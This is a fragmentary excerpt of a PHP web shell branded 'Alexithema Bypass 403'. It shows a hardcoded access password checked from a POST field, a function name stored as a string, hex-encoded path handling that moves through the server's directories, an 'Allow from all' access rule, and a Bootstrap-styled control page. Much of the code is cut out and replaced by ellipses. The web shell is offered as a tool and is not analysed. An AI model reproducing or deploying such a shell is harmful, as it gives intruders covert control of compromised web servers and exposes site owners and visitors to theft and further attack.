...
$gcw = "getcwd";
$correctPassword = "alexganteng13+13";
if (isset($_POST['alexpw'])) {
    $enteredPassword = $_POST['alexpw'];
...
?>
	...
	<head>
		<title>Bypass</title>
		<meta charset='UTF-8'>
		<meta name='author' content='Alexithema Bypass 403'>
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>Alexithema Bypass 403</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
...
Allow from all
		...
		</div><div class='text-secondary'>&copy Bypass - Alexithema Bypass 403</div>
	</div>
</div>
</body>
</html>